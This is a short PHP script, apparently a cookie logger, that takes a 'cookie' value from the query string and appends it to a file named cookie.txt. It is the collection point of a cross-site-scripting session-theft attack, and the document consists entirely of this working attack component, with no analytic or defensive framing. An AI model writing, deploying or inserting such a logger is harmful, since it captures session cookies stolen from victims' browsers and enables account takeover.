<?php
$cookie = $HTTP_GET_VARS["cookie"];
$file = fopen('cookie.txt', 'a');
fwrite($file, $cookie . "\n\n");
?>